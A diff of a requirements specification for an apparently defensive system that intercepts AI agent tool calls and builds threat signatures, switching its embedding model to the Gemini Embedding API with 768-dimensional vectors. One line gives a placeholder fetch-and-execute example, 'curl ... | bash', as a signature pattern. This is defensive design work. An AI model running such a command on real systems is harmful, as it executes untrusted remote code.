@@ -242,8 +242,8 @@ To maintain sub-10ms local performance while leveraging frontier AI capabilities
 2. WHEN generating a Threat_Signature from a BLOCK Security_Event, THE Agent_Behavioral_Analytics SHALL invoke the Hybrid_Policy_Server semanticGate to extract attackerIntent from the tool call context
 3. THE Agent_Behavioral_Analytics SHALL generalize the rawArguments JSON by replacing specific values with typed placeholders to produce the payloadPattern (e.g., `curl http://[[IP_ADDRESS]]/[[SCRIPT_NAME]] | bash`)
 4. IF the Security_Event has a non-null cbmResponse, THE Agent_Behavioral_Analytics SHALL read dependencyChain and criticalSinks directly from the cbmResponse already present on the event without issuing a new Codebase_Memory_MCP query
-5. WHEN creating a similarity vector, THE Agent_Behavioral_Analytics SHALL encode the concatenated text of attackerIntent, payloadPattern, and toolName using the Sentence Transformers embedding model
-6. THE similarity vector SHALL have consistent dimensionality of exactly 384 floats for every Threat_Signature
+5. WHEN creating a similarity vector, THE Agent_Behavioral_Analytics SHALL encode the concatenated text of attackerIntent, payloadPattern, and toolName using the Gemini Embedding API (`gemini-embedding-001` model)
+6. THE similarity vector SHALL have consistent dimensionality of exactly 768 floats for every Threat_Signature
 7. WHEN determining mitigationAction, THE Agent_Behavioral_Analytics SHALL return "BLOCK_AND_QUARANTINE_CODE_PATH" if cbmResponse.hasCriticalSink is true, "BLOCK_AND_ALERT_SECURITY_TEAM" if gtiResponse.isMalicious is true, or "BLOCK_AND_LOG" otherwise
 8. THE Agent_Behavioral_Analytics SHALL calculate a BehaviorScore using LLM-as-judge scoring the agent execution on a scale of 0 to 5
 9. IF the BehaviorScore deviates more than 0.5 from the established baseline, THE Agent_Behavioral_Analytics SHALL log an anomaly detection Security_Event with eventType SIGNATURE_CREATED
@@ -463,7 +463,7 @@ To maintain sub-10ms local performance while leveraging frontier AI capabilities
 5. THE YAML policy file SHALL define a `structuralRules` array where each rule contains: ruleId (unique string), condition (boolean expression string), action (ALLOW, BLOCK, or ESCALATE_TO_SEMANTIC), priority (integer), and enabled (boolean)
 6. THE YAML policy file SHALL define a `semanticGuidelines` array of plain-language strings that the LLM Semantic_Gating evaluates against the tool call context
 7. THE YAML policy file SHALL define an `mcpServers` block with sub-sections for `gti` and `codebaseMemory` each containing: enabled boolean, apiKey vault reference string, cacheEnabled boolean, cacheTTL integer, and timeout integer in milliseconds
-8. THE YAML policy file SHALL define a `threatSignatureGraph` block containing: dbPath, walMode boolean, maxConnections integer, similarityThreshold float, ttlSeconds integer, maxSignatures integer, and embeddingDimension integer
+8. THE YAML policy file SHALL define a `threatSignatureGraph` block containing: dbPath, walMode boolean, maxConnections integer, similarityThreshold float, ttlSeconds integer, maxSignatures integer, and embeddingDimension integer (must be 768 for gemini-embedding-001)
 9. WHEN the YAML policy file is modified on disk, THE Hybrid_Policy_Server SHALL detect the change and hot-reload the configuration without requiring a process restart
 10. THE Hybrid_Policy_Server SHALL validate the policy YAML schema on load and reject invalid configurations with descriptive error messages that identify the failing field
 11. THE `version` field in the YAML policy file SHALL follow semantic versioning format MAJOR.MINOR.PATCH
@@ -526,8 +526,8 @@ To maintain sub-10ms local performance while leveraging frontier AI capabilities
 
 #### Acceptance Criteria
 
-1. WHEN generating a Threat_Signature similarity vector, THE Agent_Behavioral_Analytics SHALL encode the concatenated text of attackerIntent, generalizedPayloadPattern, and targetToolName using the Sentence Transformers embedding model
-2. THE embedding model SHALL produce fixed-dimension vectors of exactly 384 floats for every Threat_Signature
+1. WHEN generating a Threat_Signature similarity vector, THE Agent_Behavioral_Analytics SHALL encode the concatenated text of attackerIntent, generalizedPayloadPattern, and targetToolName using the Gemini Embedding API (`gemini-embedding-001` model)
+2. THE embedding API SHALL produce fixed-dimension vectors of exactly 768 floats for every Threat_Signature
 3. WHEN querying the Threat_Signature_Graph, THE system SHALL compute cosine similarity between the query embedding vector and stored similarityVector blobs for all signatures
 4. THE cosine similarity score SHALL be in the range -1.0 to 1.0 inclusive for any pair of normalized vectors
 5. THE default similarity matching threshold SHALL be 0.85
@@ -643,21 +643,21 @@ To maintain sub-10ms local performance while leveraging frontier AI capabilities
 10. THE threatScore SHALL be stored in the Verdict structure and written to every Security_Event log entry for audit trail
 11. WHERE the YAML policy supports custom weight configuration, THE system SHALL load override weights from the policy file replacing defaults
 
-### Requirement 27: Embedding Model Management
+### Requirement 27: Gemini Embedding API Integration
 
-**User Story:** As a machine learning operations engineer, I want robust embedding model lifecycle management with fallback strategies, so that signature similarity remains functional during model failures.
+**User Story:** As a machine learning engineer, I want threat signature similarity vectors generated via the Gemini Embedding API, so that signature matching is accurate and operationally lightweight without requiring a local ML model.
 
 #### Acceptance Criteria
 
-1. THE system SHALL use a Sentence Transformers model producing 384-dimensional float vectors for all similarity encodings
-2. THE embedding model SHALL be loaded into memory on system startup and kept resident for fast inference without reloading between requests
-3. WHEN the embedding model fails to load at startup OR crashes during inference, THE system SHALL switch to degraded embedding mode
-4. WHILE in degraded embedding mode, THE Threat_Signature_Graph SHALL fall back to FTS5 full-text search on the payload_pattern and attacker_intent columns for approximate signature matching
-5. WHEN using FTS5 fallback matching, THE system SHALL reduce the similarity threshold from 0.85 to 0.7 to compensate for lower text matching precision
-6. THE system SHALL log each signature similarity query that falls back to FTS5 search rather than vector cosine similarity
-7. WHEN the embedding model is restored after a crash or restart, THE system SHALL trigger a background regeneration job to recompute similarity vectors for all signatures created during the degraded period
-8. THE background vector regeneration job SHALL run with low scheduling priority to avoid impacting real-time interception and evaluation operations
-9. THE system SHALL validate that every similarityVector stored in the signatures table has exactly 384 floats before executing cosine similarity comparisons
+1. THE system SHALL use the Gemini Embedding API (`gemini-embedding-001` model) to produce 768-dimensional float vectors for all similarity encodings
+2. WHEN calling the Gemini Embedding API, THE system SHALL use `output_dimensionality=768` and `task_type="SEMANTIC_SIMILARITY"` in every embedding request
+3. THE Gemini Embedding API client SHALL share the same paid-tier API key used for Gemini Interactions API calls (no separate credential required)
+4. THE embedding call SHALL be made asynchronously and SHALL NOT block the synchronous interception path (<10ms); embedding is only called during post-BLOCK signature generation in the asynchronous Tier 3 webhook processing flow
+5. THE system SHALL implement a 5-second timeout on embedding API calls using asyncio.wait_for()
+6. IF the embedding API call times out or returns a non-200 response, THE system SHALL fall back to FTS5 full-text search on the payload_pattern and attacker_intent columns for approximate signature matching on that specific signature only
+7. WHEN using FTS5 fallback matching for a signature with no vector, THE system SHALL reduce the similarity threshold from 0.85 to 0.7 to compensate for lower text matching precision
+8. THE system SHALL log each signature similarity query that falls back to FTS5 search due to missing vector, including the signature_id and reason
+9. THE system SHALL validate that every similarityVector stored in the signatures table has exactly 768 floats before executing cosine similarity comparisons
 10. IF a stored signature has a similarityVector with incorrect dimensionality, THE system SHALL exclude that signature from vector similarity queries and log a warning identifying the signature_id
 
 
@@ -707,7 +707,7 @@ To maintain sub-10ms local performance while leveraging frontier AI capabilities
 2. THE Docker image SHALL be based on `python:3.11-slim` or an equivalent minimal base image to reduce the attack surface
 3. THE container SHALL run the Blackwall agent process as a non-root user with dropped OS capabilities
 4. THE system SHALL expose a health check HTTP endpoint returning HTTP 200 when all components are fully operational
-5. THE health check SHALL verify: SQLite database connectivity, GTI_MCP client reachability, Codebase_Memory_MCP client reachability, embedding model loaded in memory, and policy YAML rules loaded
+5. THE health check SHALL verify: SQLite database connectivity, GTI_MCP client reachability, Codebase_Memory_MCP client reachability, Gemini Embedding API reachability, and policy YAML rules loaded
 6. THE system SHALL handle SIGTERM by initiating graceful shutdown: stop accepting new Callback_Tokens, drain the Interception_Queue of pending callbacks, and complete in-flight evaluations before exiting
 7. WHEN graceful shutdown is triggered, THE Interception_Queue SHALL stop accepting new enqueue() calls and return QUARANTINE verdicts for any newly arriving tokens
 8. THE graceful shutdown process SHALL complete within 30 seconds; IF in-flight evaluations do not complete within 30 seconds, THE system SHALL force-terminate remaining threads and exit
@@ -727,6 +727,6 @@ To maintain sub-10ms local performance while leveraging frontier AI capabilities
 5. THE system SHALL generate HTML API documentation using Sphinx or pdoc from the source docstrings
 6. THE repository SHALL include a SECURITY.md documenting: threat model, security assumptions, known limitations, and responsible vulnerability disclosure process
 7. THE repository SHALL include annotated YAML configuration examples for: the full policy.yaml structure, docker-compose environment configuration, and Kubernetes deployment manifests
-8. THE repository SHALL include a TROUBLESHOOTING.md documenting: common error messages (database is locked, circuit breaker triggered, embedding model unavailable), diagnostic steps, and resolution procedures for each
+8. THE repository SHALL include a TROUBLESHOOTING.md documenting: common error messages (database is locked, circuit breaker triggered, embedding API timeout), diagnostic steps, and resolution procedures for each
 9. THE repository SHALL include a CHANGELOG.md tracking all notable changes organized by semantic version following the Keep a Changelog format
 10. THE source code SHALL include inline comments explaining complex algorithms (batch accumulation loop, cosine similarity eviction, signature generalization), security-critical sections (audit hook installation, JIT credential downscoping), and non-obvious ADK integration patterns
